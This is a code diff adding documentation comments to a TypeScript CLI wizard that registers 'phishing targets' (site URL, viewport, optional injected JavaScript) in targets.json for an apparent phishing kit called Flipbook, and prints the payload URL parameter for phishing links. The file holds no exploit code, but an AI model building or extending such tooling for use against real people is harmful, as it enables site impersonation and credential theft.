@@ -1,7 +1,26 @@
 #!/usr/bin/env tsx
 /**
- * Interactive tool to add a new target to targets.json.
- * Usage: npm run add-target
+ * Interactive CLI tool for adding new phishing targets to targets.json.
+ * 
+ * **Usage:**
+ * ```bash
+ * npm run add-target
+ * ```
+ * 
+ * **What it does:**
+ * - Prompts for target configuration (name, URL, viewport size, etc.)
+ * - Validates input (URL format, positive integers, etc.)
+ * - Checks for existing targets and prompts for overwrite confirmation
+ * - Saves target to targets.json with proper formatting
+ * - Displays payload URL parameter for use in phishing links
+ * 
+ * **Target Configuration:**
+ * - key: Unique identifier used in phishing URLs (?t=<key>)
+ * - name: Display name shown in admin UI
+ * - url: Target site URL (must be https://)
+ * - width: Browser viewport width in pixels
+ * - height: Browser viewport height in pixels
+ * - inject_js: Optional JavaScript to inject after page load
  */
 
 import { readFile, writeFile } from 'fs/promises';
@@ -13,25 +32,37 @@ import { input, select } from '@inquirer/prompts';
 const __dirname = dirname(fileURLToPath(import.meta.url));
 const TARGETS_PATH = join(__dirname, '..', 'targets.json');
 
+/**
+ * Loads existing targets from targets.json.
+ * Returns empty object if file doesn't exist.
+ * 
+ * @returns Record of target configurations keyed by target ID
+ */
 async function loadTargets(): Promise<Record<string, unknown>> {
   if (!existsSync(TARGETS_PATH)) return {};
   const raw = await readFile(TARGETS_PATH, 'utf-8');
   return JSON.parse(raw) as Record<string, unknown>;
 }
 
+/**
+ * Main function - runs the interactive target creation wizard.
+ */
 async function main(): Promise<void> {
   console.log('\n=== Flipbook: Add Target ===\n');
 
+  // Prompt for target key (used in phishing URLs)
   const key = await input({
     message: 'Target key (used in payload URL ?t=<key>):',
     validate: (v) => v.trim().length > 0 || 'Required',
   });
 
+  // Prompt for display name (shown in admin UI)
   const name = await input({
     message: 'Display name:',
     default: key,
   });
 
+  // Prompt for target URL (must be valid URL)
   const url = await input({
     message: 'Target URL (must be https://):',
     validate: (v) => {
@@ -40,25 +71,30 @@ async function main(): Promise<void> {
     },
   });
 
+  // Prompt for viewport width (must be positive integer)
   const widthStr = await input({
     message: 'Browser viewport width:',
     default: '1920',
     validate: (v) => Number.isInteger(Number(v)) && Number(v) > 0 || 'Must be positive integer',
   });
 
+  // Prompt for viewport height (must be positive integer)
   const heightStr = await input({
     message: 'Browser viewport height:',
     default: '1080',
     validate: (v) => Number.isInteger(Number(v)) && Number(v) > 0 || 'Must be positive integer',
   });
 
+  // Prompt for optional JavaScript injection
   const injectJs = await input({
     message: 'Custom JS to inject (optional, leave blank for none):',
     default: '',
   });
 
+  // Load existing targets
   const targets = await loadTargets();
 
+  // Check if target key already exists
   if (targets[key]) {
     const overwrite = await select({
       message: `Target "${key}" already exists. Overwrite?`,
@@ -73,6 +109,7 @@ async function main(): Promise<void> {
     }
   }
 
+  // Build target configuration object
   targets[key] = {
     name: name.trim(),
     url: url.trim(),
@@ -81,11 +118,13 @@ async function main(): Promise<void> {
     ...(injectJs.trim() ? { inject_js: injectJs.trim() } : {}),
   };
 
+  // Save to targets.json with pretty formatting
   await writeFile(TARGETS_PATH, JSON.stringify(targets, null, 2), 'utf-8');
   console.log(`\nTarget "${key}" saved to targets.json`);
   console.log(`\nPayload URL param: ?t=${key}&k=<socket_key>`);
 }
 
+// Run main function and handle errors
 main().catch((err) => {
   console.error(err);
   process.exit(1);
